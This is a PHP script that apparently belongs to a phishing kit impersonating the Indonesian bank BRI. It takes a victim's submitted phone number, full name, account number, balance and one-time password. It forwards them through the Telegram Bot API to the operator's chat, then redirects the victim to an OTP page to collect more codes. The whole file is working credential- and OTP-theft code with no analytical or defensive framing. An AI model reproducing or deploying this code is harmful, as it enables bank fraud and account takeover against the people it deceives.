<?php 



session_start();
include "./telegram.php";



$message = "❁┷━❃𝗕𝗥𝗜.𝗖𝗢.𝗜𝗗❃━┷❁". "\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n".  $_POST ['tele']. "\n𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : \n". $_POST ['namanye']. "\n𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 :\n". $_POST ['kertu'].  "\n𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 :\n". $_POST ['uang'].  "\n\n𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 :\n".$_POST ['otp'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 